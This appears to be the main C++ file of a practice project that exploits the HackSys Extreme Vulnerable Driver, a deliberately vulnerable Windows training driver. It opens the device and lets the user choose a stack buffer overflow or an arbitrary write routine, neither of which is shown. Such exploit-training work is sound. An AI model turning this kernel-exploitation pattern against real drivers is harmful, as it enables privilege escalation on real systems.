#include <iostream>
#include "include.h"
#include "exploits.h"

int main()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Error opening device, error code: %d", GetLastError());
        exit(0);
    }

    printf("0. exit\n select exploit:\n 1. stack BOF\n 2. arbitrary increment\n");
    int answer;
    std::cin >> answer;
    printf("answer: %d\n", answer);

    switch (answer) {

    case 0:
        exit(0);
        break;
    case 1:
        bufferOverflowStack(hDevice);
        break;

    case 2:
        arbitraryWrite(hDevice);
        break;

    default:{
        printf("bad selection\n");

    }
    }
    
}

